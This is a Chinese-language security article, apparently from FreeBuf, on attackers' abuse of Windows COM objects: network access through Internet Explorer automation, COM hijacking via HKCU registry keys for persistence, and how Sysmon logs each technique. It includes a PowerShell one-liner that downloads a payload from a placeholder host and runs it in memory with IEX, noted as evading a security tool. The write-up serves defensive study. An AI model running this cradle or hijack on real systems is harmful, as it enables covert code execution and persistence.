## 0x00 前言

 **渗透测试人员、红队以及恶意软件都在攻击中使用COM对象，遂参考多方资料对COM的恶意应用作一个小总结。**

“微软组件对象模型（Component Object
Model，COM）是平台无关、分布式、面向对象的一种系统，可以用来创建可交互的二进制软件组件”。COM是微软OLE（复合文档）、ActiveX（互联网支持组件）以及其他组件的技术基础。

每个COM对象都对应于唯一的二进制标识符，这些全局唯一标识符为128比特（16字节），通常被称为GUID。当GUID用来标识某个COM对象时，就成为CLSID（类标识符）。某些CLSID还包含可读的文本，即ProgID

## 0x01 COM 用于恶意软件中访问网络

APT29曾使用InternetExplorer.Application COM Object 来访问 URL 和获取图像

COM可用于打开Internet Explorer来访问网络。对于恶意工具开发者有如下好处：

1\. HTTP通信由用户的iexplore.exe进程执行，而不是由恶意软件本身执行。

2\. 没有使用socket等常见网络函数。

如下代码为使用InternetExplorer.Application对象访问网络

    
    
    if (SUCCEEDED(OleInitialize(NULL)))
    
    {
    
    IWebBrowser2* pBrowser2;
    
    HRESULT hr;
    
    IDispatch* pHtmlDoc = NULL;
    
    CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER,
    
    IID_IWebBrowser2, (void**)&pBrowser2);
    
    if (pBrowser2)
    
    {
    
    VARIANT vEmpty;
    
    VariantInit(&vEmpty);
    
    BSTR bstrURL = SysAllocString(L”<http://www.> baidu. com”);
    
    HRESULT hr = pBrowser2->Navigate(bstrURL, &vEmpty, &vEmpty,&vEmpty, &vEmpty);
    
    if (SUCCEEDED(hr))
    
    {
    
    hr = pBrowser2->get_Document(&pHtmlDoc);
    
    }
    
    else
    
    {
    
    pBrowser2->Quit();
    
    }
    
    SysFreeString(bstrURL);
    
    pBrowser2->Release();
    
    }
    
    OleUninitialize();
    
    }

逆向分析时：

![](https://image.3001.net/images/20190710/1562727295_5d25537ff12de.png!small)

根据CoCreateInstance找到clsid，

![](https://image.3001.net/images/20190710/1562727281_5d255371e8369.png!small)

通过clsid可以看到progid为IE：

![](https://image.3001.net/images/20190710/1562727578_5d25549a94443.png!small)

## 0x02 COM 用于一定程度隐藏网络行为日志

### 通过InternetExplorer.Application对象访问网络

使用如下的powershell命令访问http网络：

    
    
    $ieObject= New-Object -ComObject 'InternetExplorer.Application'
    
    $ieObject.Visible= $true
    
    $ieObject.Navigate('<http://www.baidu.com>')

通过对sysmon日志分析可以发现：

有powershell启动日志，有IE启动日志，但是IE的启动日志与powershell无关

：

![](https://image.3001.net/images/20190710/1562727656_5d2554e847d1d.png!small)

### 使用如下的powershell命令直接访问网络下载文件

    
    
    $client = new-object System.Net.WebClient
    
    $client.DownString('1.1.1.1/a')

则通过sysmon日志可以看到ID 3 事件记录了powershell发生了可疑网络行为：

![](https://image.3001.net/images/20190710/1562727697_5d2555112cf95.png!small)

## 0x03 COM hijack 用于防御逃逸和持久化

### ATT&CK模型中T1122项目对此有详细描述

[APT28曾使用此技术。](https://attack.mitre.org/groups/G0007)

HKCR key是HKCU和HKLM的虚拟表示。其中主机全局设置（适用于所有用户）存储在HKLM中，单个用户的设置存储在HKCR中。

当从HKCR读取key值时，首先从HKCU\Software\Classes\clsid读取key值，如果不存在，则从HKLM读取key值.同时中低权限进程无法修改HKLM，但可以修改HKCU.因此所谓COM
hijack就是修改HKCU中的xxxx\InprocServer32中的值。公开报告中发现的恶意样本劫持过的COM

    
    
    {BCDE0395-E52F-467C-8E3D-C4579291692E}, [MMDeviceEnumerator](https://msdn.microsoft.com/en-us/library/windows/desktop/dd371399\(v=vs.85\).aspx).
    
    {d9144dcd-e998-4eca-ab6a-dcd83ccba16d}\InprocServer32EhStorShell.dll
    
    {08244ee6-92f0-47f2-9fc9-929baa2e7235}\InprocServer32 ntshrui.dll.
    
    {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}: [CAccPropServicesClass](http://msdn.microsoft.com/en-us/library/accessibility.caccpropservicesclass%28v=vs.110%29.aspx?cs-save-lang=1&cs-lang=cpp#code-snippet-1).

尝试修改了下对应注册表进行 com hijack， 在测试时，某安全工具无告警。

![](https://image.3001.net/images/20190710/1562728154_5d2556dad9687.png!small)

## 0x04 无文件下载及执行

F5078F35-C551-11D3-89B9-0000F81FE221}这个COM对象（Msxml2.XMLHTTP.3.0），可以用来下载任意代码并执行，无需将payload写入磁盘，也不会触发基于System.Net.WebClient的常用检测规。

使用如下命令：

    
    
    $o = [activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221")); $o.Open("GET", "http://xxxx/payload", $False); $o.Send(); IEX $o.responseText;

在测试时，某安全工具无告警：

![](https://image.3001.net/images/20190710/1562728220_5d25571c541e7.png!small)

Sysmon日志对powershell的网络行为有记录，但对执行内容无记录：

![](https://image.3001.net/images/20190710/1562728254_5d25573e9c259.png!small)

## 参考文章

> <https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects-> part-two.html>
>
> <https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-> objects.html>
>
> <https://attack.mitre.org/wiki/Technique/T1122>

 ***本文作者：kczwa1，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

